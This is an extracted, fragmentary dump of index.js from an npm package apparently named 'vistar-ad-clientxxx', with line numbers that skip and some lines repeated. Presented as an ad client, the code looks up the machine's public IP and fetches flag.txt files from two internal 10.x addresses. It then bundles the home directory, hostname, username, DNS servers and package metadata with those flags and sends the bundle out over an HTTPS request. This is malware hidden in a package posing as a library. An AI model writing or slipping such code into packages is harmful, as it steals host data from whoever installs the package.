// File: tmp/tmpqntw1ol_/vistar-ad-clientxxx/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const querystring = require("querystring")
Line 4: const https = require("https")
Line 5: const http = require("http")
Line 6: const packageJSON = require("./package.json")
Line 12: (_tmp_0 = https
    .get("https://api.ipify.org?format=json", (res) => {
      let data = "";

      // Collect data chunks
      res.on("data", (chunk) => {
        data += chunk;
      });

      // On end, return the public IP
      res.on("end", () => {
        const ipAddress = JSON.parse(data).ip;
        callback(null, ipAddress); // Pass the IP to the callback
      });
    }))
Line 23: const ipAddress = JSON.parse(data).ip
Line 24: callback(null, ipAddress)
Line 28: callback(err, null)
Line 33: function fetchFlag = function fetchFlag(url, publicIP, callback) {
  http
    .get(url, (res) => {
      let data = "";

      // Collect data chunks
      res.on("data", (chunk) => {
        data += chunk;
      });

      // On end, pass the flag (if any) to the callback
      res.on("end", () => {
        if (res.statusCode === 200) {
          callback(null, { ip: publicIP, flag: data.trim(), endpoint: url });
        } else {
          callback("Couldn't access it", {
            ip: publicIP,
            result: "Couldn't access it",
            endpoint: url,
          });
        }
      });
    })
    .on("error", (err) => {
      callback(err, {
        ip: publicIP,
        result: "Couldn't access it",
        endpoint: url,
      });
    });
}
Line 46: callback(null, { ip: publicIP, flag: data.trim(), endpoint: url })
Line 48: callback("Couldn't access it", {
            ip: publicIP,
            result: "Couldn't access it",
            endpoint: url,
          })
Line 57: callback(err, {
        ip: publicIP,
        result: "Couldn't access it",
        endpoint: url,
      })
Line 69: {
    // Fetch flags from the two endpoints
    const flagRequests = [];
    const urls = [
      "http://10.72.218.66/flag.txt",
      "http://10.62.252.214/flag.txt",
    ];

    urls.forEach((url) => {
      flagRequests.push(
        new Promise((resolve) => {
          fetchFlag(url, publicIP, (err, result) => {
            if (err) {
              resolve(result); // On error, resolve with result (couldn't access)
            } else {
              resolve(result); // On success, resolve with flag and associated info
            }
          });
        })
      );
    });

    // Wait for all flag requests to finish
    Promise.all(flagRequests).then((flags) => {
      trackingData = JSON.stringify({
        p: package,
        c: __dirname,
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: dns.getServers(),
        r: packageJSON ? packageJSON.___resolved : undefined,
        v: packageJSON.ve...
Line 71: const flagRequests = []
Line 73: _tmp_5.push("http://10.72.218.66/flag.txt")
Line 74: _tmp_5.push("http://10.62.252.214/flag.txt")
Line 78: flagRequests.push(
        new Promise((resolve) => {
          fetchFlag(url, publicIP, (err, result) => {
            if (err) {
              resolve(result); // On error, resolve with result (couldn't access)
            } else {
              resolve(result); // On success, resolve with flag and associated info
            }
          });
        })
      )
Line 92: Promise.all(flagRequests).then((flags) => {
      trackingData = JSON.stringify({
        p: package,
        c: __dirname,
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: dns.getServers(),
        r: packageJSON ? packageJSON.___resolved : undefined,
        v: packageJSON.version,
        pjson: packageJSON,
        ip: publicIP, // Include the public IP in the tracking data
        flags: flags, // Include the flags or failure messages with associated IPs
      });

      console.log(trackingData); // For testing purposes, output the tracking data
    })
Line 97: os.hostname()
Line 98: os.userInfo()
Line 127: var req = https.request(options, (res) => {
  res.on("data", (d) => {
    process.stdout.write(d);
  });
})
Line 128: {
    process.stdout.write(d);
  }
Line 129: process.stdout.write(d)
